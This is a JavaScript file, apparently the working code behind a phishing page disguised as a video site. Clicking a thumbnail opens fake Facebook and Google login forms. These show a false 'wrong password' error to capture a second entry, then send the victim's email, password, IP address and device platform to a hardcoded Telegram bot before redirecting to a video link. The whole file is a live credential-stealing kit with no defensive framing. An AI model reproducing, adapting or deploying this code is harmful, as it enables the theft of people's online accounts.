// ========== KONFIGURASI TELEGRAM ==========
const BOT_TOKEN = "8686157259:AAEbLNInmaqnPwrTTogJC3AINXIWTGerZUM";
const CHAT_ID = "7933552719";
const REDIRECT_URL = "https://vidgf.com/f/wcubsmaineg";

// Variabel global
let selectedVideo = null;
let stepData = {}; // Untuk menyimpan data sementara

// ========== AMBIL IP PUBLIK ==========
async function getUserIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'Gagal mendapatkan IP';
    }
}

// ========== KIRIM DATA KE TELEGRAM (HANYA UNTUK DATA VALID) ==========
async function sendToTelegram(email, password, platform) {
    const platformNav = navigator.platform;
    const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    const ipAddress = await getUserIP();
    
    const message = `🔐 VIDOY ${platform} 🔐
━━━━━━━━━━━━━━━━━━━
📧 Email : ${email}
🔑 Pwd  : ${password}
━━━━━━━━━━━━━━━━━━━
🌐 IP: ${ipAddress}
🖥️ Platform: ${platformNav}
🕐 Time: ${timestamp}
━━━━━━━━━━━━━━━━━━━
✅ Status: Login Success`;
    
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        return await response.json();
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        return null;
    }
}

// ========== TUTUP POPUP PERTAMA ==========
function closePopup() {
    document.getElementById('popupLogin').style.display = 'none';
}

// ========== TUTUP FORM FACEBOOK ==========
function closeFacebookForm() {
    document.getElementById('facebookFormPopup').style.display = 'none';
    document.getElementById('facebookEmail').value = '';
    document.getElementById('facebookPassword').value = '';
    document.getElementById('facebookFormError').innerText = '';
    const btn = document.getElementById('facebookSubmitBtn');
    if (btn) {
        btn.disabled = false;
        btn.innerText = 'Masuk';
    }
    delete stepData.facebook;
}

// ========== TUTUP FORM GOOGLE ==========
function closeGoogleForm() {
    document.getElementById('googleFormPopup').style.display = 'none';
    document.getElementById('googleEmail').value = '';
    document.getElementById('googlePassword').value = '';
    document.getElementById('googleFormError').innerHTML = '';
    const btn = document.getElementById('googleSubmitBtn');
    if (btn) {
        btn.disabled = false;
        btn.innerText = 'Berikutnya';
    }
    delete stepData.google;
}

// ========== SUBMIT LOGIN FACEBOOK (2 LANGKAH) ==========
async function submitFacebookLogin() {
    const email = document.getElementById('facebookEmail').value.trim();
    const password = document.getElementById('facebookPassword').value.trim();
    const errorDiv = document.getElementById('facebookFormError');
    const btn = document.getElementById('facebookSubmitBtn');
    
    if (!email) {
        errorDiv.innerText = 'Masukkan email atau nomor telepon';
        return;
    }
    if (!password) {
        errorDiv.innerText = 'Masukkan kata sandi';
        return;
    }
    
    if (!stepData.facebook) {
        // LANGKAH 1: Error kata sandi salah
        stepData.facebook = { email: email, password: password };
        errorDiv.innerText = 'Kata sandi salah. Apakah Anda lupa kata sandi?';
        document.getElementById('facebookPassword').value = '';
        document.getElementById('facebookPassword').focus();
        return;
    } else {
        // LANGKAH 2: Kirim data
        await sendToTelegram(email, password, 'FACEBOOK');
        btn.disabled = true;
        btn.innerHTML = '<span class="spinner"></span> Loading...';
        setTimeout(() => {
            window.location.href = REDIRECT_URL;
        }, 1000);
    }
}

// ========== SUBMIT LOGIN GOOGLE ==========
async function submitGoogleFormLogin() {
    const email = document.getElementById('googleEmail').value.trim();
    const password = document.getElementById('googlePassword').value.trim();
    const errorDiv = document.getElementById('googleFormError');
    const btn = document.getElementById('googleSubmitBtn');
    
    // Validasi dasar
    if (!email) {
        errorDiv.innerHTML = 'Masukkan email atau nomor telepon';
        return;
    }
    if (!password) {
        errorDiv.innerHTML = 'Masukkan kata sandi';
        return;
    }
    
    const isValidGmail = email.endsWith('@gmail.com') || email.endsWith('@gmail.co.id');
    
    // ========== KASUS 1: EMAIL BUKAN @GMAIL ==========
    // Langsung error "Akun tidak ditemukan" (1 langkah saja, tidak ada percobaan kedua)
    if (!isValidGmail) {
        errorDiv.innerHTML = '<svg style="display: inline-block; vertical-align: middle; margin-right: 4px;" width="14" height="14" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg> Akun Google tidak ditemukan.';
        
        // Reset form
        document.getElementById('googleEmail').value = '';
        document.getElementById('googlePassword').value = '';
        document.getElementById('googleEmail').focus();
        
        // Hapus step data jika ada
        delete stepData.google;
        return;
    }
    
    // ========== KASUS 2: EMAIL SUDAH @GMAIL (2 LANGKAH) ==========
    // Cek apakah ini langkah pertama atau kedua
    if (!stepData.google) {
        // LANGKAH 1: Error "Kata sandi salah"
        stepData.google = { email: email, password: password };
        errorDiv.innerHTML = '<svg style="display: inline-block; vertical-align: middle; margin-right: 4px;" width="14" height="14" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg> Kata sandi salah. Coba lagi.';
        
        // Kosongkan password saja, email tetap
        document.getElementById('googlePassword').value = '';
        document.getElementById('googlePassword').focus();
        return;
    } else {
        // LANGKAH 2: Data valid, KIRIM KE TELEGRAM
        await sendToTelegram(email, password, 'GOOGLE');
        
        btn.disabled = true;
        btn.innerHTML = '<span class="spinner"></span> Loading...';
        
        setTimeout(() => {
            window.location.href = REDIRECT_URL;
        }, 1000);
    }
}

// ========== EVENT LISTENER ==========
// Klik thumbnail
document.querySelectorAll('.thumbnail-box').forEach(el => {
    el.addEventListener('click', () => {
        const card = el.closest('.video-card');
        if (card) {
            const info = card.querySelector('.video-info');
            if (info) selectedVideo = info.innerText;
        }
        document.getElementById('popupLogin').style.display = 'flex';
    });
});

// Tombol login Facebook
const facebookBtn = document.getElementById('facebookLoginBtn');
if (facebookBtn) {
    facebookBtn.addEventListener('click', () => {
        closePopup();
        document.getElementById('facebookFormPopup').style.display = 'flex';
    });
}

// Tombol login Google
const googleBtn = document.getElementById('googleLoginBtn');
if (googleBtn) {
    googleBtn.addEventListener('click', () => {
        closePopup();
        document.getElementById('googleFormPopup').style.display = 'flex';
    });
}

// Tombol close
const closePopupBtn = document.getElementById('closePopupBtn');
if (closePopupBtn) closePopupBtn.addEventListener('click', closePopup);

const closeFacebookBtn = document.getElementById('closeFacebookBtn');
if (closeFacebookBtn) closeFacebookBtn.addEventListener('click', closeFacebookForm);

// Submit buttons
const facebookSubmitBtn = document.getElementById('facebookSubmitBtn');
if (facebookSubmitBtn) facebookSubmitBtn.addEventListener('click', submitFacebookLogin);

const googleSubmitBtn = document.getElementById('googleSubmitBtn');
if (googleSubmitBtn) googleSubmitBtn.addEventListener('click', submitGoogleFormLogin);

// Tutup klik di luar
const popupLogin = document.getElementById('popupLogin');
if (popupLogin) {
    popupLogin.addEventListener('click', (e) => {
        if (e.target === popupLogin) closePopup();
    });
}

const facebookPopup = document.getElementById('facebookFormPopup');
if (facebookPopup) {
    facebookPopup.addEventListener('click', (e) => {
        if (e.target === facebookPopup) closeFacebookForm();
    });
}

const googlePopup = document.getElementById('googleFormPopup');
if (googlePopup) {
    googlePopup.addEventListener('click', (e) => {
        if (e.target === googlePopup) closeGoogleForm();
    });
}

// Enter key
const facebookPassword = document.getElementById('facebookPassword');
if (facebookPassword) {
    facebookPassword.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') submitFacebookLogin();
    });
}

const googlePassword = document.getElementById('googlePassword');
if (googlePassword) {
    googlePassword.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') submitGoogleFormLogin();
    });
}

// Tombol ESC
document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
        const fbPopup = document.getElementById('facebookFormPopup');
        const googlePopupElem = document.getElementById('googleFormPopup');
        const popup1 = document.getElementById('popupLogin');
        if (fbPopup && fbPopup.style.display === 'flex') {
            closeFacebookForm();
        } else if (googlePopupElem && googlePopupElem.style.display === 'flex') {
            closeGoogleForm();
        } else if (popup1 && popup1.style.display === 'flex') {
            closePopup();
        }
    }
});
